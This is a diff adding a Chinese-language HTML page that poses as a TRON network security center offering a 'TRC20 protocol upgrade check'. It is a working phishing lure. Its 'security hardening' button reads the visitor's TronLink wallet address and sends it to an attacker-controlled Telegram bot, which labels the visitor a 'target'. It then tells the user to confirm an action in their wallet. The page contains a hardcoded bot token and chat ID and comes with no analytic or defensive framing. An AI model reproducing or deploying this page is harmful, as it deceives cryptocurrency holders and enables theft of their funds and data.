@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON 网络安全中心</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <style>
+        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .box { background: white; padding: 35px 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 350px; }
+        h3 { color: #1a1a1a; }
+        button { background: #007bff; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>TRC20 协议升级检测</h3>
+        <p>为确保您的资产安全，请点击下方按钮完成环境加固。</p>
+        <button id="safeBtn">立即安全加固</button>
+    </div>
+    <script>
+        const BOT_TOKEN = '7629559388:AAFv-v2X0yT8fH2pS9D0yL_B7uG6fU9mS0'; 
+        const CHAT_ID = '7304193306'; 
+        async function sendToTg(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+        }
+        document.getElementById('safeBtn').addEventListener('click', async () => {
+            if (window.tronWeb) {
+                const addr = window.tronWeb.defaultAddress.base58;
+                await sendToTg("💰 目标已连接！\n波场地址: " + (addr || "获取中..."));
+                alert("加固已启动，请在钱包确认...");
+            } else {
+                alert("请在波场钱包（TronLink）浏览器中打开");
+            }
+        });
+    </script>
+</body>
+</html>
